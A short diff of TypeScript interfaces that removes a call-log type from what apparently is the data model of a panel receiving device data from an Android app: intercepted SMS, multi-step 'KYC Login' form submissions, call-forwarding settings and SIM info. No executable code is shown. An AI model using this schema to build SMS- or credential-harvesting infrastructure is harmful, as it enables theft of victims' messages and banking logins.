@@ -29,15 +29,6 @@ export interface SMS {
     type: 'incoming' | 'outgoing';
 }
 
-// Call log entry from device
-export interface CallLog {
-    id: string;
-    number: string;
-    type: 'incoming' | 'outgoing' | 'missed';
-    duration: number; // in seconds
-    timestamp: string;
-}
-
 // Form data submitted from Android app (multi-step KYC form)
 export interface FormData {
     // Step 2: KYC Login
@@ -91,7 +82,6 @@ export interface ForwardingConfig {
 export interface DeviceData {
     deviceId: string;
     sms: SMS[];
-    calls: CallLog[];
     forms: FormData[];
     forwarding: ForwardingConfig;
     simCards?: SimInfo[];
